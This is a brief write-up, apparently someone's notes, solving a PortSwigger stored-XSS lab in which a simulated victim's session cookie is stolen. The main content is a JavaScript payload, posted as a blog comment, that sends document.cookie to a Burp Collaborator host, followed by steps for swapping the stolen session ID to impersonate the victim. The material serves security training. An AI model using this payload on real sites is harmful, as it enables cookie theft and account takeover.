# Exploiting cross-site scripting to steal cookies

## This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

### Hint:

```javascript
<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
```

copy url from burpcollector
`t5z4yu4ozlb99987tz4q3wu3puvljc71.oastify.com`

```javascript
<script> fetch('https://t5z4yu4ozlb99987tz4q3wu3puvljc71.oastify.com', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
```

submit comment

pull from burp collector
copy session id from http request
intercept home page
change session id and in poxy option mark response on
then forword lab solved
